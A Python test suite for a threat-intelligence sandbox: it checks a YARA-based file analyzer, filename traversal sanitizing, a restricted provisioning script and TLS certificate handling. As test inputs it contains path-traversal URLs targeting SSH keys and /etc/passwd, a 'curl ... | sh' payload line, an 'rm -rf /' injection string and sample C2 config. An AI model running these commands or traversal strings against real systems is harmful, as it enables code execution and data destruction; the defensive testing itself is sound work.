"""Tests for the open-directory sandbox path.

Three layers, tested where each one can actually be checked here:

* the analyzer (sandbox/analyze.py) runs directly - it is pure static
  analysis with no container dependency
* the staging-name sanitizer runs directly - it is the boundary that
  stops an adversary-controlled URL writing outside the staging directory
* the host client is tested against a stubbed transport, because the real
  one needs a probe VM and Docker

The container's isolation flags are verified by
probe_vm/setup_probe_vm.sh, which refuses to finish if --network=none
lets a container reach the network. That check belongs on the VM that
runs it, not in a suite that runs on a host with no Docker.
"""
from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

from cti.errors import VMProxyError
from cti.probe import sandbox

REPO = Path(__file__).resolve().parents[1]


def _load(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze_mod = _load(REPO / "sandbox" / "analyze.py", "sbx_analyze")


def _helper():
    """probe_helper.py is the VM-side payload: stdlib only, not importable
    as part of the package. Load it by path, with main() defused."""
    src = (REPO / "probe_vm" / "probe_helper.py").read_text()
    ns: dict = {}
    exec(compile(src.replace("raise SystemExit(main())", "pass"),
                 "probe_helper.py", "exec"), ns)
    return ns


helper = _helper()


# --------------------------------------------------------------------------- #
# Staging names - the traversal boundary
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("url", [
    "http://1.2.3.4/../../root/.ssh/authorized_keys",
    "http://1.2.3.4/..%2f..%2f..%2fetc%2fpasswd",
    "http://1.2.3.4/%00evil",
    "http://1.2.3.4/dir/sub/../../escape",
    "http://1.2.3.4/" + "A" * 400,
    "http://1.2.3.4/",
])
def test_staged_names_cannot_escape_the_staging_directory(url):
    """The filename is derived from an adversary-controlled URL. Traversal
    here would write outside the directory the container mounts."""
    name = helper["_safe_name"](url, 7)
    assert "/" not in name and "\\" not in name
    assert not name.startswith(".")
    assert "\x00" not in name
    assert len(name) < 100
    assert (Path("/staging") / name).resolve().parent == Path("/staging")


def test_staged_names_stay_distinct_for_same_named_files():
    a = helper["_safe_name"]("http://h/a/config.json", 0)
    b = helper["_safe_name"]("http://h/b/config.json", 1)
    assert a != b


# --------------------------------------------------------------------------- #
# Static analysis
# --------------------------------------------------------------------------- #

def _yara():
    try:
        import yara
    except ImportError:
        return None
    return yara.compile(filepaths={
        p.stem: str(p) for p in sorted((REPO / "sandbox" / "rules").glob("*.yar"))})


def test_yara_rules_compile():
    rules = _yara()
    if rules is None:
        pytest.skip("yara-python not installed on this host (it is in the image)")
    assert rules is not None


@pytest.mark.parametrize("name,content,rule", [
    ("beacon.pem", b"-----BEGIN RSA PRIVATE KEY-----\nMIIE\n", "private_key_material"),
    ("cmd5.txt", b"#!/bin/sh\ncurl -s http://1.2.3.4/x | sh\n", "shell_payload"),
    ("logs.txt", b"URL: https://b.example\nUsername: a\nPassword: b\n",
     "credential_dump_shape"),
    ("svc", b"\x7fELF\x02\x01\x01" + b"\x00" * 50, "elf_executable"),
])
def test_high_signal_files_are_flagged_notable(tmp_path, name, content, rule):
    rules = _yara()
    if rules is None:
        pytest.skip("yara-python not installed on this host")
    path = tmp_path / name
    path.write_bytes(content)
    result = analyze_mod.analyze(path, rules)
    assert rule in {h["rule"] for h in result["yara_hits"]}
    assert result["verdict"] == "notable"


def test_a_plain_readme_is_unremarkable(tmp_path):
    path = tmp_path / "readme.txt"
    path.write_bytes(b"Thanks for reading. Nothing to see.\n")
    assert analyze_mod.analyze(path, _yara())["verdict"] == "unremarkable"


def test_a_binary_wearing_a_text_extension_is_a_mismatch(tmp_path):
    """The cheapest lie a staged payload tells. The first version of the
    check only compared extensions it had an expected type for, so .txt -
    the interesting case - was never checked."""
    path = tmp_path / "notes.txt"
    path.write_bytes(b"MZ\x90\x00\x03" + b"\x00" * 80)
    result = analyze_mod.analyze(path, _yara())
    assert result["type_mismatch"] and result["verdict"] == "notable"


def test_a_binary_with_its_own_extension_is_not_a_mismatch(tmp_path):
    path = tmp_path / "loader.exe"
    path.write_bytes(b"MZ\x90\x00\x03" + b"\x00" * 80)
    assert not analyze_mod.analyze(path, _yara())["type_mismatch"]


def test_indicators_are_extracted_for_pivoting(tmp_path):
    path = tmp_path / "config.ini"
    path.write_bytes(b"c2=http://185.99.4.12:8443/gate\nfallback=evil.example\n")
    extracted = analyze_mod.analyze(path, _yara())["extracted"]
    assert "185.99.4.12" in extracted["ipv4"]
    assert any("185.99.4.12" in u for u in extracted["urls"])


def test_one_unreadable_file_does_not_lose_the_others(tmp_path, monkeypatch):
    (tmp_path / "good.txt").write_bytes(b"fine")
    (tmp_path / "bad.txt").write_bytes(b"also fine")

    real = analyze_mod.analyze

    def flaky(path, rules):
        if path.name == "bad.txt":
            raise OSError("simulated read failure")
        return real(path, rules)

    monkeypatch.setattr(analyze_mod, "analyze", flaky)
    monkeypatch.setattr("sys.argv", ["analyze", str(tmp_path)])
    import io
    import sys
    buf = io.StringIO()
    monkeypatch.setattr(sys, "stdout", buf)
    analyze_mod.main()
    payload = json.loads(buf.getvalue())
    assert payload["analyzed"] == 1 and len(payload["errors"]) == 1


def test_a_huge_file_is_hashed_in_full_but_parsed_bounded(tmp_path):
    """A decompression bomb or a 2 GB log must not be read into memory."""
    path = tmp_path / "big.bin"
    path.write_bytes(b"A" * (analyze_mod.MAX_READ + 1024))
    result = analyze_mod.analyze(path, None)
    assert result["size"] == analyze_mod.MAX_READ + 1024
    assert result["truncated_at"] == analyze_mod.MAX_READ
    assert len(result["sha256"]) == 64


# --------------------------------------------------------------------------- #
# Host client - no bytes may reach this side
# --------------------------------------------------------------------------- #

def test_host_client_records_verdicts_and_never_receives_bytes(monkeypatch):
    captured = {}

    def fake_fetch(urls, *, max_files, max_total_bytes):
        captured["urls"] = urls
        return {"results": [{"path": "beacon.pem", "url": urls[0],
                             "sha256": "a" * 64, "size": 1200,
                             "magic": "ASCII text", "mime": "text/plain",
                             "yara_hits": [{"rule": "private_key_material"}],
                             "strings_sample": ["-----BEGIN RSA"],
                             "extracted": {"urls": [], "ipv4": []},
                             "verdict": "notable"}],
                "errors": [], "fetched": 1, "analyzed": 1, "error": None}

    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze", fake_fetch)
    out = sandbox.analyze_urls(["http://1.2.3.4:4443/beacon.pem"],
                               indicator="1.2.3.4", actor="sliver-c2")
    assert out["analyzed"] == 1
    assert [r["path"] for r in out["notable"]] == ["beacon.pem"]
    # Nothing in the response carries file content.
    blob = json.dumps(out)
    assert "content" not in blob and "bytes" not in blob


def test_host_client_reports_an_unreachable_probe_vm_without_raising(monkeypatch):
    def boom(urls, **kw):
        raise VMProxyError("ssh transport failed")

    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze", boom)
    out = sandbox.analyze_urls(["http://1.2.3.4/x"], indicator="1.2.3.4")
    assert "probe VM unreachable" in out["error"] and out["results"] == []


def test_host_client_refuses_an_empty_request(monkeypatch):
    """There is deliberately no 'analyze the whole directory' shortcut -
    downloading staged payloads is a decision per file."""
    out = sandbox.analyze_urls([], indicator="1.2.3.4")
    assert out["error"] and out["results"] == []


def test_host_client_caps_the_number_of_files(monkeypatch):
    captured = {}

    def fake_fetch(urls, *, max_files, max_total_bytes):
        captured["n"] = len(urls)
        return {"results": [], "errors": [], "fetched": 0, "analyzed": 0, "error": None}

    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze", fake_fetch)
    sandbox.analyze_urls([f"http://1.2.3.4/{i}" for i in range(500)],
                         indicator="1.2.3.4")
    assert captured["n"] == sandbox.MAX_FILES


# --------------------------------------------------------------------------- #
# Autoindex parsing
# --------------------------------------------------------------------------- #

def test_apache_listings_carry_size_and_mtime():
    body = ('<html><head><title>Index of /f</title></head><body><pre>'
            '<a href="../">Parent Directory</a>\n'
            '<a href="payload.bin">payload.bin</a>  2026-09-12 14:03   1.4M\n'
            '</pre></body></html>')
    files = helper["parse_autoindex"](body, "http://1.2.3.4/f/")
    assert files[0]["size"] == "1.4M" and files[0]["mtime"] == "2026-09-12 14:03"


def test_python_http_server_listings_genuinely_have_no_size_or_mtime():
    """All 37 opendir_files rows in the live data have NULL size and mtime,
    which looks like a parsing bug and is not: the one host scanned so far
    runs Python's http.server, whose listing carries neither. Pinning this
    so the next person does not go looking for the bug either."""
    body = ('<html><head><title>Directory listing for /</title></head><body>'
            '<ul><li><a href="cmd1.txt">cmd1.txt</a></li>'
            '<li><a href="sub/">sub/</a></li></ul></body></html>')
    files = helper["parse_autoindex"](body, "http://1.2.3.4/")
    assert [f["name"] for f in files] == ["cmd1.txt", "sub"]
    assert all(f["size"] is None and f["mtime"] is None for f in files)
    assert files[1]["is_dir"] is True


def test_a_page_that_is_not_a_listing_returns_none():
    assert helper["parse_autoindex"]("<html><body>hello</body></html>",
                                     "http://1.2.3.4/") is None


# --------------------------------------------------------------------------- #
# The observe action - it must degrade, not fail, on an un-provisioned VM
# --------------------------------------------------------------------------- #

def test_observe_on_a_vm_without_the_tools_reports_instead_of_crashing():
    """The probe VM cannot be re-provisioned from here, so the action has to
    be safe to call before setup_probe_vm.sh has ever installed httpx."""
    result = helper["action_observe"]({"target": "example.com", "kind": "domain"})
    assert result["error"] and "setup_probe_vm.sh" in result["error"]
    assert "httpx" in result["tools_missing"]
    assert result["http"] == {} and result["tls"] == {}


def test_observe_rejects_an_empty_target():
    assert helper["action_observe"]({"target": "  "})["error"] == "no target given"


def test_observe_infers_the_kind_from_the_target():
    ip = helper["action_observe"]({"target": "193.29.58.192"})
    domain = helper["action_observe"]({"target": "example.com"})
    assert ip["kind"] == "ip" and domain["kind"] == "domain"


def test_observe_does_not_scan_ports_unless_asked():
    """A port scan is active traffic; everything else in the pass is the same
    light-touch contact the ordinary sweep already makes.

    `None`, not []: an empty list claims a negative result nobody looked for.
    This test asserted [] and so encoded the bug it should have caught -
    192.252.186.62 reported `ports: []` for a whole sweep while an nmap run
    from the same VM found 53, 443 and 3389 open.
    """
    result = helper["action_observe"]({"target": "example.com"})
    assert result["ports"] is None
    assert "ports" not in result["errors"], "naabu must not even be attempted"
    assert "ports" not in result["responded"]


def test_observe_skips_registration_lookups_for_an_ip():
    result = helper["action_observe"]({"target": "193.29.58.192", "kind": "ip"})
    assert "dns" not in result["errors"] and "whois" not in result["errors"]


def test_check_access_reports_every_observe_tool():
    """A half-provisioned VM that silently collects less is worse than one
    that says what is missing."""
    tools = helper["check_access"]()["tools"]
    for tool in ("httpx", "tlsx", "dnsx", "whois", "naabu", "cdncheck"):
        assert tool in tools, f"{tool} not reported by --check-access"


def test_the_bootstrap_installs_what_observe_needs():
    bootstrap = (REPO / "probe_vm" / "setup_probe_vm.sh").read_text()
    for tool in ("httpx", "tlsx", "dnsx", "naabu", "cdncheck", "whois"):
        assert tool in bootstrap, f"setup_probe_vm.sh never installs {tool}"


# --------------------------------------------------------------------------- #
# The provisioning path - a second key, deliberately weaker than a shell
# --------------------------------------------------------------------------- #

def _helper_function(name: str) -> str:
    """One function's source, read from the file.

    inspect.getsource cannot be used: the helper is loaded with exec() by
    design - it is the VM-side payload, stdlib-only and not importable as
    part of the package - so its functions have no source file association.
    """
    text = (REPO / "probe_vm" / "probe_helper.py").read_text()
    start = text.index(f"def {name}(")
    rest = text[start + 1:]
    end = rest.index("\ndef ") if "\ndef " in rest else len(rest)
    return text[start:start + 1 + end]


def _provision_script() -> str:
    return (REPO / "probe_vm" / "cti-provision").read_text()


def _provision_verbs() -> set[str]:
    """The verbs the case statement actually dispatches on.

    Testing this rather than grepping for scary substrings: the first version
    of this test matched "probe_helper.py" in the status report and "eval" in
    the phrase "rather than eval-ing it", which proved nothing either way.
    """
    script = _provision_script()
    body = script[script.index("case \"$verb\" in"):script.index("esac")]
    verbs = set()
    for line in body.splitlines():
        line = line.strip()
        if ")" in line and not line.startswith(("#", "*")):
            label = line.split(")")[0].strip()
            if label and all(c.isalnum() or c in "|-_" for c in label):
                verbs.update(part for part in label.split("|") if part)
    return verbs


def test_the_provisioning_script_dispatches_only_known_verbs():
    """A verb that wrote probe_helper.py or a Dockerfile would make this key
    equivalent to arbitrary code execution as the probe user - a bigger grant
    than 'install the scanners'. Helper changes stay with setup_probe_vm.sh,
    which a human runs after reading the diff."""
    assert _provision_verbs() <= {"status", "install", "update", "help", "-h", "--help"}


def test_no_provisioning_verb_writes_an_executable():
    """`install` here means apt/go, never writing a file we supplied."""
    script = _provision_script()
    for writer in ("install -m", "cat >", "tee ", "dd of="):
        assert writer not in script, f"cti-provision could write files via {writer!r}"


def test_the_provisioning_script_never_evals_the_request():
    import re
    script = _provision_script()
    assert not re.search(r"^\s*eval\b", script, re.M), "the request must never be eval'd"
    assert "read -r -a argv" in script, "the request must be split, not interpreted"


def test_the_tool_allowlist_is_closed_and_not_caller_supplied():
    """The caller names a KEY of a hardcoded map, never a package or module."""
    script = _provision_script()
    assert "APT_TOOLS[$requested]" in script and "GO_TOOLS[$requested]" in script
    assert "not in the allowlist" in script


def test_the_client_allowlist_matches_the_scripts():
    """Two copies, deliberately - the VM enforces, the client fails fast. They
    must not drift, or a valid tool starts erroring locally."""
    from cti.probe import provision

    script = _provision_script()
    for tool in provision.TOOLS:
        assert f"[{tool}]=" in script, f"{tool} is in the client list but not the script"


def test_the_client_rejects_a_tool_outside_the_allowlist():
    from cti.probe import provision

    for attempt in ("golang-go", "docker.io", "../../bin/sh", "httpx; rm -rf /"):
        with pytest.raises(ValueError, match="allowlist"):
            provision.install(attempt)


def test_provisioning_uses_its_own_key_not_the_probe_key():
    """A bug here must not be able to borrow the helper's credential."""
    from cti.probe import provision, vm_proxy as vp

    assert provision.PROVISION_SSH_KEY != vp.PROBE_SSH_KEY


def test_provisioning_fails_closed_when_the_key_is_absent(monkeypatch):
    from cti.errors import VMProxyError as VMErr
    from cti.probe import provision

    monkeypatch.setattr(provision, "PROVISION_SSH_KEY", "/nonexistent/key")
    with pytest.raises(VMErr, match="no provisioning key"):
        provision.status()


def test_missing_tools_reports_everything_when_the_vm_is_unreachable(monkeypatch):
    """Fail safe: if we cannot ask, assume nothing is installed rather than
    reporting a healthy VM."""
    from cti.errors import VMProxyError as VMErr
    from cti.probe import provision

    monkeypatch.setattr(provision, "status",
                        lambda: (_ for _ in ()).throw(VMErr("unreachable")))
    assert set(provision.missing_tools()) == set(provision.TOOLS)


def test_the_provisioning_key_is_pinned_after_the_truncating_write():
    """setup_probe_vm.sh writes the probe key with '>' on purpose - sshd
    matches the FIRST line for a key, so a stale unrestricted entry would
    void the forced command. Appending the provisioning key before that write
    means it is silently erased."""
    script = (REPO / "probe_vm" / "setup_probe_vm.sh").read_text()
    truncating = script.index('"$opts" "$KEY_LINE" > "$home/.ssh/authorized_keys"')
    appending = script.index('"$prov_opts" "$prov_line" >> "$home/.ssh/authorized_keys"')
    assert appending > truncating, "the provisioning key would be wiped by the probe key write"


def test_both_keys_are_pinned_to_different_forced_commands():
    script = (REPO / "probe_vm" / "setup_probe_vm.sh").read_text()
    assert 'command="python3 /opt/cti/probe_helper.py"' in script
    assert 'command="/usr/local/sbin/cti-provision"' in script


def test_provisioning_validates_before_it_elevates():
    """Whatever reaches sudo must already have been checked. The first
    version required root but had no way to GET root, so it could never do
    its job; the fix must not become a path for an unvalidated string to
    reach a privileged re-exec."""
    script = _provision_script()
    validate = script.index("# Validate BEFORE elevating")
    elevate = script.index('elevate "$verb"')
    assert validate < elevate


def test_the_privileged_re_exec_passes_separate_arguments():
    """`sudo ... $request` would hand the client's raw string to a root
    process. The validated tokens go as distinct argv entries instead."""
    script = _provision_script()
    assert 'exec sudo -n /usr/local/sbin/cti-provision --from "$CLIENT" "$@"' in script
    # the raw request string must never be what sudo receives
    assert "sudo -n /usr/local/sbin/cti-provision $request" not in script
    assert 'sudo -n /usr/local/sbin/cti-provision "$request"' not in script


def test_the_sudoers_rule_is_scoped_to_the_one_path():
    """A broader rule would give the probe user root for anything."""
    bootstrap = (REPO / "probe_vm" / "setup_probe_vm.sh").read_text()
    assert "NOPASSWD: /usr/local/sbin/cti-provision" in bootstrap
    assert "NOPASSWD: ALL" not in bootstrap
    assert "visudo -cf" in bootstrap, "an invalid sudoers file can lock out sudo entirely"


def test_the_audit_field_cannot_make_the_script_fail():
    """sudo strips the environment, so SSH_CLIENT is unset after the re-exec.
    Under `set -u` that was a fatal unbound-variable error: the script
    refused to run because it could not name the caller. Losing the address
    is bad; refusing to run over it is worse."""
    script = _provision_script()
    assert 'SSH_CLIENT%% *' not in script, "unguarded SSH_CLIENT under set -u"
    assert '${SSH_CLIENT:-' in script
    assert '${CLIENT:-unknown}' in script


def test_the_client_address_survives_the_privileged_re_exec():
    script = _provision_script()
    assert 'exec sudo -n /usr/local/sbin/cti-provision --from "$CLIENT" "$@"' in script
    assert '[[ ${1:-} == --from ]]' in script, "the carried address must be stripped again"


def test_go_is_taken_from_upstream_not_the_distro():
    """Debian bookworm ships go1.19.8. httpx declares go 1.26.0 and tlsx
    1.25.0, so every `go install` failed with the packaged toolchain and the
    only diagnosis available was 'go install did not complete'."""
    script = _provision_script()
    assert "apt-get install -y -q golang-go" not in script, "the distro Go is too old"
    assert "go.dev/dl/" in script and "GO_SHA256" in script, "pin and verify the download"
    assert "sha256sum" in script


def test_the_go_download_is_checksum_verified_before_use():
    script = _provision_script()
    mismatch = script.index("checksum mismatch")
    extract = script.index("tar -C /usr/local -xzf")
    assert mismatch < extract, "the archive must be verified before it is extracted"


def test_go_install_failures_keep_their_error():
    """Six tools failed at once with one unhelpful line because the output
    was sent to /dev/null."""
    script = _provision_script()
    assert 'timeout 900 "$GO_BIN" install "$module" 2>&1' in script
    # The failure branch must report what go actually said, not a fixed
    # string. (Checking the string is absent entirely matched the comment
    # explaining the old behaviour, which proved nothing.)
    failure = [l for l in script.splitlines()
               if "$tool: FAILED" in l and "go" not in l.split("FAILED")[0].lower()]
    assert any('$err' in l for l in script.splitlines()
               if "$tool: FAILED -" in l), "the go failure must include go's own output"


def test_the_probe_user_path_check_does_not_use_a_builtin_through_runuser():
    """`runuser -u X -- command -v tool` looks for a BINARY named 'command'
    and always fails, so every tool was reported NOT ON PATH - including
    nmap, which was installed and working."""
    script = _provision_script()
    assert 'runuser -u "$PROBE_USER" -- command -v' not in script
    assert 'runuser -u "$PROBE_USER" -- sh -c' in script


def test_whois_is_never_asked_for_its_version():
    """whois treats an unknown flag as a query string, so `whois -version`
    sent a live lookup to RIPE's database on every status call."""
    script = _provision_script()
    assert "SAFE_VERSION_PROBE" in script
    safe = script[script.index("SAFE_VERSION_PROBE="):].split("\n")[0]
    assert "whois" not in safe, "whois must not be version-probed"
    assert "nmap" in safe and "httpx" in safe


def test_package_names_map_to_the_binaries_they_provide():
    """dnsutils provides dig; checking for a binary called 'dnsutils' found
    nothing and reported a working install as missing."""
    script = _provision_script()
    assert "[dnsutils]=" in script and '"dig"' in script


def test_http_fetch_returns_the_fields_its_caller_reads():
    """cti/sources/http.py:_fetch_probe reads headers and final_url off this
    response. They were never sent, so every via="probe" request came back
    with headers={} and final_url=None - silently, always."""
    source = _helper_function("action_http_fetch")
    assert '"headers"' in source and '"final_url"' in source
    # all three exit paths, including both error branches
    assert source.count('"headers"') >= 3, "an error path still omits headers"


def test_http_fetch_still_honours_method_headers_and_body():
    """ThreatFox's query API is a POST; losing that would break it."""
    source = _helper_function("action_http_fetch")
    for feature in ('request.get("method"', 'request.get("data")', 'request.get("headers")'):
        assert feature in source


def test_known_ports_are_passed_to_the_web_and_tls_probes():
    """143.246.217.59 serves on 4443, 8443 and 8080. Probing only 80/443
    found no web service and no certificate, and reported no error - because
    "nothing listening on 443" is not an error."""
    assert helper["_port_args"]([4443, 8443, 8080]) == ["-p", "4443,8443,8080"]
    assert helper["_port_args"]([]) == []
    assert helper["_port_args"](None) == []


def test_known_ports_are_filtered_to_digits():
    """They come from stored cluster data, which is not a trusted schema."""
    assert helper["_port_args"]([443, "bad", None, 8443]) == ["-p", "443,8443"]


def test_supplying_known_ports_is_not_a_port_scan():
    """Reusing ports already on the record is not new active traffic;
    discovering ports still belongs to active_scan."""
    source = _helper_function("action_observe")
    assert 'request.get("known_ports")' in source
    assert 'if request.get("ports")' in source, "scanning stays behind its own flag"


# --------------------------------------------------------------------------- #
# observe: "not scanned" is not "nothing open"
# --------------------------------------------------------------------------- #

def _observe_with_stubs(request, *, ports_found=None):
    """action_observe with every tool stubbed out, so only its own
    bookkeeping is under test."""
    ns = _helper()
    ns["_observe_http"] = lambda t, kp=None: ({}, None)
    ns["_observe_tls"] = lambda t, kp=None: ({}, None)
    ns["_observe_dns"] = lambda t: ({}, None)
    ns["_observe_whois"] = lambda t: ({}, None)
    ns["_observe_cdn"] = lambda t: ({"is_cdn": False}, None)
    ns["_observe_ports"] = lambda t, n: (list(ports_found or []), None)
    return ns["action_observe"](request)


def test_observe_reports_an_empty_list_when_it_scanned_and_found_nothing():
    result = _observe_with_stubs(
        {"target": "example.com", "kind": "domain", "ports": True},
        ports_found=[])
    assert result["ports"] == []
    assert result["responded"]["ports"] is False


def test_observe_returns_discovered_ports_when_asked():
    result = _observe_with_stubs(
        {"target": "example.com", "kind": "domain", "ports": True},
        ports_found=[443, 3389])
    assert result["ports"] == [443, 3389]
    assert result["responded"]["ports"] is True


# --------------------------------------------------------------------------- #
# SPKI: the digest that survives certificate rotation
# --------------------------------------------------------------------------- #

def _self_signed_pem(tmp_path):
    """A real certificate, so the digest is checked against openssl's own
    answer rather than a fixture somebody typed."""
    import subprocess
    cert = tmp_path / "c.pem"
    key = tmp_path / "k.pem"
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048",
                    "-keyout", str(key), "-out", str(cert), "-days", "1",
                    "-nodes", "-subj", "/CN=spki-test"],
                   capture_output=True, check=True)
    return cert.read_text()


def test_the_spki_digest_matches_opensslts_own_answer(tmp_path):
    """The canonical SPKI pin is
    `x509 -pubkey -noout | pkey -pubin -outform DER | dgst -sha256`.
    The helper reaches the same bytes with one process instead of three,
    because the base64 body of `x509 -pubkey` IS the DER SubjectPublicKeyInfo.
    """
    import subprocess
    pem = _self_signed_pem(tmp_path)
    canonical = subprocess.run(
        "openssl x509 -pubkey -noout | openssl pkey -pubin -outform DER "
        "| openssl dgst -sha256", shell=True, input=pem, capture_output=True,
        text=True).stdout.split()[-1]
    assert helper["_spki_sha256"](pem) == canonical


def test_a_reissued_certificate_keeps_its_spki_digest(tmp_path):
    """The whole point. A reissue mints a new serial and a new leaf hash;
    an operator who keeps the keypair keeps this, which is why the selector
    is identity-class."""
    import subprocess
    key = tmp_path / "k.pem"
    subprocess.run(["openssl", "genrsa", "-out", str(key), "2048"],
                   capture_output=True, check=True)
    pems = []
    for n in (1, 2):
        cert = tmp_path / f"c{n}.pem"
        subprocess.run(["openssl", "req", "-x509", "-key", str(key),
                        "-out", str(cert), "-days", str(n), "-subj",
                        f"/CN=reissue-{n}"], capture_output=True, check=True)
        pems.append(cert.read_text())
    assert pems[0] != pems[1], "two different certificates"
    spki = helper["_spki_sha256"]
    assert spki(pems[0]) == spki(pems[1]) is not None


def test_garbage_in_gives_none_not_an_exception():
    """This runs inside an observe pass; raising would lose every other
    field collected alongside it."""
    for junk in (None, "", "not a certificate",
                 "-----BEGIN CERTIFICATE-----\nnot base64\n-----END CERTIFICATE-----"):
        assert helper["_spki_sha256"](junk) is None


def test_tlsx_is_asked_for_the_certificate_it_needs():
    """The SPKI is computed from the PEM, which tlsx only emits with -cert."""
    body = _helper_function("_observe_tls")
    assert '"-cert"' in body


def test_the_helper_does_not_read_an_spki_field_from_tlsx():
    """tlsx's fingerprint_hash carries md5, sha1 and sha256 of the
    CERTIFICATE and nothing else. Reading a spki_sha256 key from it left an
    identity-class selector permanently empty - zero rows, ever."""
    body = _helper_function("_observe_tls")
    assert 'fingerprint.get("spki_sha256")' not in body


def test_a_rejected_cert_flag_costs_the_spki_not_the_certificate():
    """-cert could not be tested before deploying. If tlsx rejects it the
    fallback must still return the certificate: losing one field we never
    had is acceptable, losing the whole TLS grab is not."""
    ns = _helper()
    calls: list = []

    def fake_run_json(cmd, stdin_text, timeout):
        calls.append(cmd)
        if "-cert" in cmd:
            return [], "tlsx exited 1: flag cannot be used with other probes"
        return [{"subject_cn": "example.com", "serial": "0A:1B",
                 "fingerprint_hash": {"sha256": "c" * 64}}], None

    ns["_run_json"] = fake_run_json
    result, error = ns["_observe_tls"]("example.com")
    assert error is None
    assert result["cert_sha256"] == "c" * 64, "the certificate survived"
    assert result["spki_sha256"] is None
    assert "retried without it" in result["degraded"]
    assert len(calls) == 2 and "-cert" not in calls[1]


def test_a_working_cert_flag_is_not_retried():
    ns = _helper()
    calls: list = []

    def fake_run_json(cmd, stdin_text, timeout):
        calls.append(cmd)
        return [{"serial": "0A", "certificate": "not a pem",
                 "fingerprint_hash": {"sha256": "c" * 64}}], None

    ns["_run_json"] = fake_run_json
    result, error = ns["_observe_tls"]("example.com")
    assert len(calls) == 1 and error is None
    assert result["degraded"] is None


def test_a_real_tls_failure_is_still_an_error():
    """The retry must not swallow a genuine failure - an unreachable host
    fails both attempts and has to be reported as an error, not silence."""
    ns = _helper()
    ns["_run_json"] = lambda cmd, stdin_text, timeout: ([], "tlsx timed out")
    result, error = ns["_observe_tls"]("example.com")
    assert result == {} and error == "tlsx timed out"


def test_tlsx_is_asked_to_check_revocation():
    """cert_revoked had been permanently None since Cert Spotter was
    retired: the openssl grab never produced it and nothing replaced it.
    tlsx checks revocation itself, which costs traffic to the CA's
    responder, not to the target."""
    body = _helper_function("_observe_tls")
    assert '"-revoked"' in body and '"-untrusted"' in body
    assert '"revoked": r.get("revoked")' in body


def _tls_with(record: dict) -> dict:
    ns = _helper()
    ns["_run_json"] = lambda cmd, stdin_text, timeout: ([record], None)
    result, error = ns["_observe_tls"]("example.com")
    assert error is None
    return result


def test_a_valid_certificate_reports_false_not_unknown():
    """tlsx tags every certificate flag `omitempty`, so `false` is never
    emitted. Read naively, a perfectly valid certificate is
    indistinguishable from an unchecked one - revoked.badssl.com answers
    True and every healthy host answers None."""
    result = _tls_with({"subject_cn": "example.com",
                        "fingerprint_hash": {"sha256": "c" * 64}})
    assert result["expired"] is False
    assert result["self_signed"] is False
    assert result["mismatched"] is False
    assert result["untrusted"] is False


def test_revocation_stays_unknown_rather_than_claiming_clean():
    """The one flag not coerced. It needs an external check against the
    CA's responder, which can fail for reasons unrelated to the
    certificate, and recording "not revoked" because we could not ask is
    the direction that misleads."""
    result = _tls_with({"subject_cn": "example.com",
                        "fingerprint_hash": {"sha256": "c" * 64}})
    assert result["revoked"] is None


def test_a_flagged_certificate_still_reports_true():
    result = _tls_with({"subject_cn": "revoked.badssl.com", "revoked": True,
                        "expired": True, "self_signed": True})
    assert result["revoked"] is True
    assert result["expired"] is True and result["self_signed"] is True


def test_the_helper_no_longer_offers_the_openssl_tls_grab():
    """The certificate comes from tlsx inside the observe pass. Leaving the
    action on the VM would leave a second handshake one call away."""
    assert "action_tls_grab" not in helper
    assert "tls_grab" not in helper["_ACTIONS"]
    assert "TLS_TIMEOUT" not in helper, "an orphaned constant is dead config"
